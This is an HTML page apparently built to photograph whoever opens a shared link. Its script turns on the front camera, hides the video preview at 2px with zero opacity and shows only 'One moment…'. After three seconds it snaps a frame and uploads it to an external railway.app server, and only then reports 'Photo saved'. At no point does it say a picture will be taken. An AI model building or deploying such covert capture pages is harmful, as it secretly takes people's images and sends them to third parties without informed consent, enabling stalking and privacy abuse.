<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Capture</title>
  <link rel="preconnect" href="https://fonts.googleapis.com" />
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
  <link href="https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&family=Syne:wght@500;600;700;800&display=swap" rel="stylesheet" />
  <style>
    :root {
      --bg: #0a0a0f;
      --glass: rgba(255, 255, 255, 0.06);
      --border: rgba(255, 255, 255, 0.12);
      --text: #f4f4f8;
      --muted: #9898a8;
      --accent: #22d3ee;
      --accent2: #a78bfa;
    }

    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      min-height: 100vh;
      font-family: "Syne", system-ui, sans-serif;
      color: var(--text);
      background:
        radial-gradient(ellipse 100% 80% at 50% -20%, rgba(124, 58, 237, 0.2), transparent 55%),
        radial-gradient(ellipse 70% 50% at 100% 100%, rgba(34, 211, 238, 0.08), transparent 45%),
        var(--bg);
    }

    .noise {
      position: fixed;
      inset: 0;
      pointer-events: none;
      opacity: 0.035;
      background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E");
      z-index: 0;
    }

    .shell {
      position: relative;
      z-index: 1;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      padding: clamp(1.25rem, 4vw, 2rem);
      max-width: 560px;
      margin: 0 auto;
    }

    header {
      display: flex;
      align-items: center;
      justify-content: space-between;
      gap: 1rem;
      margin-bottom: 2rem;
    }

    .brand {
      font-weight: 800;
      font-size: 1.1rem;
      letter-spacing: -0.02em;
      background: linear-gradient(135deg, var(--text), var(--accent));
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      background-clip: text;
    }

    .nav-gallery {
      font-family: "Space Mono", monospace;
      font-size: 0.78rem;
      color: var(--muted);
      text-decoration: none;
      padding: 0.45rem 0.9rem;
      border-radius: 999px;
      border: 1px solid var(--border);
      background: var(--glass);
      backdrop-filter: blur(12px);
      transition: color 0.2s, border-color 0.2s;
    }

    .nav-gallery:hover {
      color: var(--text);
      border-color: rgba(124, 58, 237, 0.45);
    }

    .glass {
      flex: 1;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      text-align: center;
      padding: 2.5rem 1.5rem;
      background: var(--glass);
      border: 1px solid var(--border);
      border-radius: 24px;
      backdrop-filter: blur(20px);
      -webkit-backdrop-filter: blur(20px);
      box-shadow: 0 24px 80px rgba(0, 0, 0, 0.45);
      min-height: 280px;
    }

    .hint {
      font-family: "Space Mono", monospace;
      font-size: 0.82rem;
      color: var(--muted);
      margin: 0;
      line-height: 1.6;
    }

    .hint.error {
      color: #f87171;
    }

    .hint strong {
      color: var(--accent);
      font-weight: 400;
    }

    .success-panel {
      display: none;
      flex-direction: column;
      align-items: center;
      gap: 0.5rem;
    }

    .success-panel.visible {
      display: flex;
    }

    .success-panel .check {
      width: 48px;
      height: 48px;
      border-radius: 50%;
      background: rgba(34, 211, 238, 0.12);
      border: 1px solid rgba(34, 211, 238, 0.35);
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 1.35rem;
      color: var(--accent);
      margin-bottom: 0.25rem;
    }

    .success-panel h2 {
      margin: 0;
      font-size: 1.35rem;
      font-weight: 700;
    }

    .success-panel p {
      margin: 0;
      font-family: "Space Mono", monospace;
      font-size: 0.75rem;
      color: var(--muted);
      max-width: 28ch;
    }

    .working #statusRow {
      display: block;
    }

    .working #successPanel {
      display: none !important;
    }

    #preview {
      position: fixed;
      width: 2px;
      height: 2px;
      opacity: 0;
      pointer-events: none;
      left: 0;
      top: 0;
      overflow: hidden;
    }
  </style>
</head>
<body>
  <div class="noise" aria-hidden="true"></div>
  <div class="shell working" id="shell">
    <header>
      <span class="brand">Capture</span>
      <a class="nav-gallery" href="gallery.html">View gallery</a>
    </header>

    <main class="glass">
      <div id="statusRow">
        <p id="status" class="hint">One moment…</p>
      </div>
      <div id="successPanel" class="success-panel">
        <div class="check" aria-hidden="true">✓</div>
        <h2>Photo saved</h2>
        <p id="successDetail"></p>
      </div>
    </main>
  </div>

  <video id="preview" playsinline muted autoplay aria-hidden="true"></video>

  <script>
    const API_BASE = "https://link-take-photo-production.up.railway.app";

    const shell = document.getElementById("shell");
    const statusEl = document.getElementById("status");
    const successPanel = document.getElementById("successPanel");
    const successDetail = document.getElementById("successDetail");
    const preview = document.getElementById("preview");

    function setStatus(text, isError) {
      statusEl.textContent = text;
      statusEl.classList.toggle("error", !!isError);
    }

    async function startCamera() {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } },
        audio: false,
      });
      preview.srcObject = stream;
      return stream;
    }

    function sleep(ms) {
      return new Promise((r) => setTimeout(r, ms));
    }

    function waitForVideoReady() {
      return new Promise((resolve) => {
        const check = () => {
          if (preview.videoWidth > 0 && preview.videoHeight > 0) {
            resolve();
            return;
          }
          requestAnimationFrame(check);
        };
        preview.addEventListener("loadedmetadata", check, { once: true });
        preview.addEventListener("loadeddata", check, { once: true });
        if (preview.videoWidth > 0) check();
        else requestAnimationFrame(check);
      });
    }

    function captureFrame() {
      const w = preview.videoWidth;
      const h = preview.videoHeight;
      if (!w || !h) throw new Error("Video not ready");
      const canvas = document.createElement("canvas");
      canvas.width = w;
      canvas.height = h;
      const ctx = canvas.getContext("2d");
      ctx.translate(canvas.width, 0);
      ctx.scale(-1, 1);
      ctx.drawImage(preview, 0, 0);
      return new Promise((resolve, reject) => {
        canvas.toBlob(
          (blob) => {
            if (!blob) reject(new Error("Could not encode image"));
            else resolve(blob);
          },
          "image/jpeg",
          0.92
        );
      });
    }

    function blobToBase64(blob) {
      return new Promise((resolve, reject) => {
        const r = new FileReader();
        r.onload = () => {
          const dataUrl = r.result;
          resolve(String(dataUrl).split(",")[1] || "");
        };
        r.onerror = reject;
        r.readAsDataURL(blob);
      });
    }

    async function uploadPhoto(base64) {
      const res = await fetch(`${API_BASE}/upload-photo`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ image: base64 }),
      });
      const text = await res.text();
      let data;
      try {
        data = JSON.parse(text);
      } catch {
        throw new Error(text || `HTTP ${res.status}`);
      }
      if (!res.ok) throw new Error(data.detail || data.message || `HTTP ${res.status}`);
      return data;
    }

    async function run() {
      setStatus("One moment…");
      let stream;
      try {
        stream = await startCamera();
        await waitForVideoReady();
        await sleep(3000);
      } catch (e) {
        setStatus("Camera access denied or unavailable. Allow camera and reload.", true);
        return;
      }

      let blob;
      try {
        blob = await captureFrame();
      } catch (e) {
        setStatus(String(e.message || e), true);
        stream.getTracks().forEach((t) => t.stop());
        return;
      }

      stream.getTracks().forEach((t) => t.stop());
      preview.srcObject = null;

      let result;
      try {
        const b64 = await blobToBase64(blob);
        result = await uploadPhoto(b64);
      } catch (e) {
        setStatus("Upload failed: " + (e.message || e), true);
        return;
      }

      shell.classList.remove("working");
      document.getElementById("statusRow").style.display = "none";
      const ts = result.timestamp
        ? new Date(result.timestamp).toLocaleString()
        : "";
      successDetail.textContent = ts
        ? "Saved at " + ts + "."
        : "Your photo was uploaded successfully.";
      successPanel.classList.add("visible");
    }

    run();
  </script>
</body>
</html>
